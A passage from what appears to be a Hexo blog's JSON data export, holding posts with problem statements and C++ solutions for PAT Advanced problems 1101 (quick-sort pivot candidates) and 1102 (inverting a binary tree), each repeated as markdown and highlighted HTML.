&lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n"},{"title":"PAT advanced 1101","date":"2017-02-20T12:24:51.000Z","_content":"\n## Description\n\n> 1101.Quick Sort\n\n> There is a classical process named partition in the famous quick sort algorithm. In this process we typically choose one element as the pivot. Then the elements less than the pivot are moved to its left and those larger than the pivot to its right. Given N distinct positive integers after a run of partition, could you tell how many elements could be the selected pivot for this partition?\n\n> For example, given N = 5 and the numbers 1, 3, 2, 4, and 5. We have:\n\n> 1 could be the pivot since there is no element to its left and all the elements to its right are larger than it;\n3 must not be the pivot since although all the elements to its left are smaller, the number 2 to its right is less than it as well;\n2 must not be the pivot since although all the elements to its right are larger, the number 3 to its left is larger than it as well;\nand for the similar reason, 4 and 5 could also be the pivot.\nHence in total there are 3 pivot candidates.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line gives a positive integer N (<= 105). Then the next line contains N distinct positive integers no larger than 109. The numbers in a line are separated by spaces.\n\n> Output Specification:\n\n> For each test case, output in the first line the number of pivot candidates. Then in the next line print these candidates in increasing order. There must be exactly 1 space between two adjacent numbers, and no extra space at the end of each line.\n\n> Sample Input:\n5\n1 3 2 4 5\n\n> Sample Output:\n3\n1 4 5\n\n用两个数组维护最大最小值\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nint n;\nint num[maxN];\nint flag;\nint minn[maxN];\nint maxn[maxN];\nint ans[maxN];\nint tmp;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tnum[0] = numeric_limits<int>::min();\n\tnum[n + 1] = numeric_limits<int>::max();\n\tfor (int i = 1; i <= n; i++)\n\t\tscanf(\"%d\", &num[i]);\n\tfor (int i = 1; i <= n; i++)\n\t\tmaxn[i] = max(maxn[i - 1], num[i]);\n\tminn[n + 1] = num[n + 1];\n\tfor (int i = n; i >= 1; i--)\n\t\tminn[i] = min(minn[i + 1], num[i]);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tif (num[i] > maxn[i - 1] && num[i] < minn[i + 1])\n\t\t{\n\t\t\tans[flag] = num[i];\n\t\t\tflag++;\n\t\t}\n\t}\n\tprintf(\"%d\\n\", flag);\n\tfor (int i = 0; i < flag; i++)\n\t\t(!i) ? printf(\"%d\", ans[i]) : printf(\" %d\", ans[i]);\n\tprintf(\"\\n\");\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1101.md","raw":"---\ntitle: PAT advanced 1101\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-20 20:24:51\n---\n\n## Description\n\n> 1101.Quick Sort\n\n> There is a classical process named partition in the famous quick sort algorithm. In this process we typically choose one element as the pivot. Then the elements less than the pivot are moved to its left and those larger than the pivot to its right. Given N distinct positive integers after a run of partition, could you tell how many elements could be the selected pivot for this partition?\n\n> For example, given N = 5 and the numbers 1, 3, 2, 4, and 5. We have:\n\n> 1 could be the pivot since there is no element to its left and all the elements to its right are larger than it;\n3 must not be the pivot since although all the elements to its left are smaller, the number 2 to its right is less than it as well;\n2 must not be the pivot since although all the elements to its right are larger, the number 3 to its left is larger than it as well;\nand for the similar reason, 4 and 5 could also be the pivot.\nHence in total there are 3 pivot candidates.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line gives a positive integer N (<= 105). Then the next line contains N distinct positive integers no larger than 109. The numbers in a line are separated by spaces.\n\n> Output Specification:\n\n> For each test case, output in the first line the number of pivot candidates. Then in the next line print these candidates in increasing order. There must be exactly 1 space between two adjacent numbers, and no extra space at the end of each line.\n\n> Sample Input:\n5\n1 3 2 4 5\n\n> Sample Output:\n3\n1 4 5\n\n用两个数组维护最大最小值\n\n## Code\n\n```\n#include<cstdio>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nint n;\nint num[maxN];\nint flag;\nint minn[maxN];\nint maxn[maxN];\nint ans[maxN];\nint tmp;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tnum[0] = numeric_limits<int>::min();\n\tnum[n + 1] = numeric_limits<int>::max();\n\tfor (int i = 1; i <= n; i++)\n\t\tscanf(\"%d\", &num[i]);\n\tfor (int i = 1; i <= n; i++)\n\t\tmaxn[i] = max(maxn[i - 1], num[i]);\n\tminn[n + 1] = num[n + 1];\n\tfor (int i = n; i >= 1; i--)\n\t\tminn[i] = min(minn[i + 1], num[i]);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tif (num[i] > maxn[i - 1] && num[i] < minn[i + 1])\n\t\t{\n\t\t\tans[flag] = num[i];\n\t\t\tflag++;\n\t\t}\n\t}\n\tprintf(\"%d\\n\", flag);\n\tfor (int i = 0; i < flag; i++)\n\t\t(!i) ? printf(\"%d\", ans[i]) : printf(\" %d\", ans[i]);\n\tprintf(\"\\n\");\n\treturn 0;\n}\n```","slug":"PAT-advanced-1101","published":1,"updated":"2017-02-20T12:27:51.487Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0y002thv18xux36xiy","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1101.Quick Sort</p>\n<p>There is a classical process named partition in the famous quick sort algorithm. In this process we typically choose one element as the pivot. Then the elements less than the pivot are moved to its left and those larger than the pivot to its right. Given N distinct positive integers after a run of partition, could you tell how many elements could be the selected pivot for this partition?</p>\n<p>For example, given N = 5 and the numbers 1, 3, 2, 4, and 5. We have:</p>\n<p>1 could be the pivot since there is no element to its left and all the elements to its right are larger than it;<br>3 must not be the pivot since although all the elements to its left are smaller, the number 2 to its right is less than it as well;<br>2 must not be the pivot since although all the elements to its right are larger, the number 3 to its left is larger than it as well;<br>and for the similar reason, 4 and 5 could also be the pivot.<br>Hence in total there are 3 pivot candidates.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;= 105). Then the next line contains N distinct positive integers no larger than 109. The numbers in a line are separated by spaces.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in the first line the number of pivot candidates. Then in the next line print these candidates in increasing order. There must be exactly 1 space between two adjacent numbers, and no extra space at the end of each line.</p>\n<p>Sample Input:<br>5<br>1 3 2 4 5</p>\n<p>Sample Output:<br>3<br>1 4 5</p>\n</blockquote>\n<p>用两个数组维护最大最小值</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> num[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> flag;</div><div class=\"line\"><span class=\"keyword\">int</span> minn[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> maxn[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> tmp;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tnum[<span class=\"number\">0</span>] = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::min();</div><div class=\"line\">\tnum[n + <span class=\"number\">1</span>] = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::max();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;num[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\tmaxn[i] = max(maxn[i - <span class=\"number\">1</span>], num[i]);</div><div class=\"line\">\tminn[n + <span class=\"number\">1</span>] = num[n + <span class=\"number\">1</span>];</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n; i &gt;= <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\tminn[i] = min(minn[i + <span class=\"number\">1</span>], num[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num[i] &gt; maxn[i - <span class=\"number\">1</span>] &amp;&amp; num[i] &lt; minn[i + <span class=\"number\">1</span>])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans[flag] = num[i];</div><div class=\"line\">\t\t\tflag++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, flag);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; flag; i++)</div><div class=\"line\">\t\t(!i) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, ans[i]) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, ans[i]);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1101.Quick Sort</p>\n<p>There is a classical process named partition in the famous quick sort algorithm. In this process we typically choose one element as the pivot. Then the elements less than the pivot are moved to its left and those larger than the pivot to its right. Given N distinct positive integers after a run of partition, could you tell how many elements could be the selected pivot for this partition?</p>\n<p>For example, given N = 5 and the numbers 1, 3, 2, 4, and 5. We have:</p>\n<p>1 could be the pivot since there is no element to its left and all the elements to its right are larger than it;<br>3 must not be the pivot since although all the elements to its left are smaller, the number 2 to its right is less than it as well;<br>2 must not be the pivot since although all the elements to its right are larger, the number 3 to its left is larger than it as well;<br>and for the similar reason, 4 and 5 could also be the pivot.<br>Hence in total there are 3 pivot candidates.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;= 105). Then the next line contains N distinct positive integers no larger than 109. The numbers in a line are separated by spaces.</p>\n<p>Output Specification:</p>\n<p>For each test case, output in the first line the number of pivot candidates. Then in the next line print these candidates in increasing order. There must be exactly 1 space between two adjacent numbers, and no extra space at the end of each line.</p>\n<p>Sample Input:<br>5<br>1 3 2 4 5</p>\n<p>Sample Output:<br>3<br>1 4 5</p>\n</blockquote>\n<p>用两个数组维护最大最小值</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> num[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> flag;</div><div class=\"line\"><span class=\"keyword\">int</span> minn[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> maxn[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> ans[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> tmp;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tnum[<span class=\"number\">0</span>] = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::min();</div><div class=\"line\">\tnum[n + <span class=\"number\">1</span>] = numeric_limits&lt;<span class=\"keyword\">int</span>&gt;::max();</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;num[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\tmaxn[i] = max(maxn[i - <span class=\"number\">1</span>], num[i]);</div><div class=\"line\">\tminn[n + <span class=\"number\">1</span>] = num[n + <span class=\"number\">1</span>];</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n; i &gt;= <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\tminn[i] = min(minn[i + <span class=\"number\">1</span>], num[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num[i] &gt; maxn[i - <span class=\"number\">1</span>] &amp;&amp; num[i] &lt; minn[i + <span class=\"number\">1</span>])</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans[flag] = num[i];</div><div class=\"line\">\t\t\tflag++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, flag);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; flag; i++)</div><div class=\"line\">\t\t(!i) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, ans[i]) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, ans[i]);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1102","date":"2017-03-03T12:11:10.000Z","_content":"\n## Description\n\n> 1102.Invert a Binary Tree\n\n> Google: 90% of our engineers use the software you wrote (Homebrew), but you can't invert a binary tree on a whiteboard so fuck off.\n\n> Now it's your turn to prove that YOU CAN invert a binary tree!\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line gives a positive integer N (<=10) which is the total number of nodes in the tree -- and hence the nodes are numbered from 0 to N-1. Then N lines follow, each corresponds to a node from 0 to N-1, and gives the indices of the left and right children of the node. If the child does not exist, a \"-\" will be put at the position. Any pair of children are separated by a space.\n\n> Output Specification:\n\n> For each test case, print in the first line the level-order, and then in the second line the in-order traversal sequences of the inverted tree. There must be exactly one space between any adjacent numbers, and no extra space at the end of the line.\n\n> Sample Input:\n8\n1 -\n\\- -\n0 -\n2 7\n\\- -\n\\- -\n5 -\n4 6\n\n> Sample Output:\n3 7 2 6 4 0 5 1\n6 5 7 4 3 2 0 1\n\ndfs+inorder，考前练手。。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 10;\n\nint n;\nint node[maxN][2];\nchar x;\nint y;\nint z;\nint root[maxN];\nint flag;\n\nvoid dfs(int root)\n{\n\tqueue<int> q;\n\tq.push(root);\n\twhile (!q.empty())\n\t{\n\t\tint tmp;\n\t\ttmp = q.front();\n\t\tq.pop();\n\t\ttmp == root ? printf(\"%d\", tmp) : printf(\" %d\", tmp);\n\t\tif (node[tmp][1] != -1)\n\t\t\tq.push(node[tmp][1]);\n\t\tif (node[tmp][0] != -1)\n\t\t\tq.push(node[tmp][0]);\n\t}\n\tprintf(\"\\n\");\n}\n\nvoid inorder(int root)\n{\n\tif (node[root][1] != -1) inorder(node[root][1]);\n\t++z != n ? printf(\"%d \", root): printf(\"%d\\n\", root);\n\tif (node[root][0] != -1) inorder(node[root][0]);\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\t((x = getchar()) != 45) ? (node[i][0] = x - '0') : (node[i][0] = -1);\n\t\tgetchar();\n\t\t((x = getchar()) != 45 )? (node[i][1] = x - '0') : (node[i][1] = -1);\n\t\tgetchar();\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\ty = node[i][0];\n\t\tif (y != -1)\n\t\t\troot[y] = 1;\n\t\ty = node[i][1];\n\t\tif (y != -1)\n\t\t\troot[y] = 1;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t\tif (root[i] != 1)\n\t\t{\n\t\t\tflag = i;\n\t\t\tbreak;\n\t\t}\n\tdfs(flag);\n\tinorder(flag);\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1102.md","raw":"---\ntitle: PAT advanced 1102\ntags:\n  - PAT\ncategories: []\ndate: 2017-03-03 20:11:10\n---\n\n## Description\n\n> 1102.Invert a Binary Tree\n\n> Google: 90% of our engineers use the software you wrote (Homebrew), but you can't invert a binary tree on a whiteboard so fuck off.\n\n> Now it's your turn to prove that YOU CAN invert a binary tree!\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line gives a positive integer N (<=10) which is the total number of nodes in the tree -- and hence the nodes are numbered from 0 to N-1. Then N lines follow, each corresponds to a node from 0 to N-1, and gives the indices of the left and right children of the node. If the child does not exist, a \"-\" will be put at the position. Any pair of children are separated by a space.\n\n> Output Specification:\n\n> For each test case, print in the first line the level-order, and then in the second line the in-order traversal sequences of the inverted tree. There must be exactly one space between any adjacent numbers, and no extra space at the end of the line.\n\n> Sample Input:\n8\n1 -\n\\- -\n0 -\n2 7\n\\- -\n\\- -\n5 -\n4 6\n\n> Sample Output:\n3 7 2 6 4 0 5 1\n6 5 7 4 3 2 0 1\n\ndfs+inorder，考前练手。。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 10;\n\nint n;\nint node[maxN][2];\nchar x;\nint y;\nint z;\nint root[maxN];\nint flag;\n\nvoid dfs(int root)\n{\n\tqueue<int> q;\n\tq.push(root);\n\twhile (!q.empty())\n\t{\n\t\tint tmp;\n\t\ttmp = q.front();\n\t\tq.pop();\n\t\ttmp == root ? printf(\"%d\", tmp) : printf(\" %d\", tmp);\n\t\tif (node[tmp][1] != -1)\n\t\t\tq.push(node[tmp][1]);\n\t\tif (node[tmp][0] != -1)\n\t\t\tq.push(node[tmp][0]);\n\t}\n\tprintf(\"\\n\");\n}\n\nvoid inorder(int root)\n{\n\tif (node[root][1] != -1) inorder(node[root][1]);\n\t++z != n ? printf(\"%d \", root): printf(\"%d\\n\", root);\n\tif (node[root][0] != -1) inorder(node[root][0]);\n}\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\t((x = getchar()) != 45) ? (node[i][0] = x - '0') : (node[i][0] = -1);\n\t\tgetchar();\n\t\t((x = getchar()) != 45 )? (node[i][1] = x - '0') : (node[i][1] = -1);\n\t\tgetchar();\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\ty = node[i][0];\n\t\tif (y != -1)\n\t\t\troot[y] = 1;\n\t\ty = node[i][1];\n\t\tif (y != -1)\n\t\t\troot[y] = 1;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t\tif (root[i] != 1)\n\t\t{\n\t\t\tflag = i;\n\t\t\tbreak;\n\t\t}\n\tdfs(flag);\n\tinorder(flag);\n\treturn 0;\n}\n```","slug":"PAT-advanced-1102","published":1,"updated":"2017-03-03T12:15:10.231Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k10002vhv18qhi8iykc","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1102.Invert a Binary Tree</p>\n<p>Google: 90% of our engineers use the software you wrote (Homebrew), but you can’t invert a binary tree on a whiteboard so fuck off.</p>\n<p>Now it’s your turn to prove that YOU CAN invert a binary tree!</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;=10) which is the total number of nodes in the tree – and hence the nodes are numbered from 0 to N-1. Then N lines follow, each corresponds to a node from 0 to N-1, and gives the indices of the left and right children of the node. If the child does not exist, a “-“ will be put at the position. Any pair of children are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in the first line the level-order, and then in the second line the in-order traversal sequences of the inverted tree. There must be exactly one space between any adjacent numbers, and no extra space at the end of the line.</p>\n<p>Sample Input:<br>8<br>1 -<br>- -<br>0 -<br>2 7<br>- -<br>- -<br>5 -<br>4 6</p>\n<p>Sample Output:<br>3 7 2 6 4 0 5 1<br>6 5 7 4 3 2 0 1</p>\n</blockquote>\n<p>dfs+inorder，考前练手。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> node[maxN][<span class=\"number\">2</span>];</div><div class=\"line\"><span class=\"keyword\">char</span> x;</div><div class=\"line\"><span class=\"keyword\">int</span> y;</div><div class=\"line\"><span class=\"keyword\">int</span> z;</div><div class=\"line\"><span class=\"keyword\">int</span> root[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> flag;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\t<span 